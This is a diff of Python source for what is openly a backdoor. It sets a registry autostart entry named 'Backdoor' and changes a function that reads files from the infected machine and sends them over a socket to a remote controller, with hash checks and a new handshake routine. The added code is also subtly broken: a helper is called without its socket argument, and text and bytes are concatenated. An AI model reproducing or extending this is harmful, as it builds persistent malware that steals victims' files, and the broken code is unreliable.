@@ -39,26 +39,35 @@ def setAutostart():
             as key:
                 wrg.SetValueEx(key, "Backdoor", 0, wrg.REG_SZ, '"' + executablePath + '"')
 
+def waitNetwork(mySocket):
+    mySocket.send('!INTERUPT')
+    returnPacket = ''
+    while returnPacket != 'READY':
+        returnPacket = mySocket.recv(chunksize).decode()
+
 def sendFile(mySocket, path):
     try:
         # https://www.geeksforgeeks.org/python/how-to-get-file-size-in-python/
         #socket.send(os.path.getsize(path)
 
         fileHash = hashlib.new(hashAlgorithm)
+        header = 'FILE='
+        footer = '=FILE'
+        headerLength = len(header.encode())
+        footerLength = len(footer.encode())
+        totalLength = headerLength + footerLength
         with open(path, 'rb') as file:
             # walrus operator so we loop for the whole file
-            while packet := file.read(chunksize):
+            while packet := file.read(chunksize - totalLength):
                 # https://www.geeksforgeeks.org/python/python-program-to-find-hash-of-file/
                 fileHash.update(packet)
-                mySocket.send(packet)
-        mySocket.send('DONE'.encode())
+                mySocket.send(header + packet + footer)
         hexdigest = fileHash.hexdigest()
-        returnPacket = ''
-        while returnPacket != 'READY':
-            returnPacket = mySocket.recv(chunksize).decode()
+        waitNetwork()
         mySocket.send(hexdigest.encode())
 
     except FileNotFoundError:
+        waitNetwork()
         mySocket.send('File not found'.encode())
     except Exception as e:
         mySocket.send('ERROR'.encode())
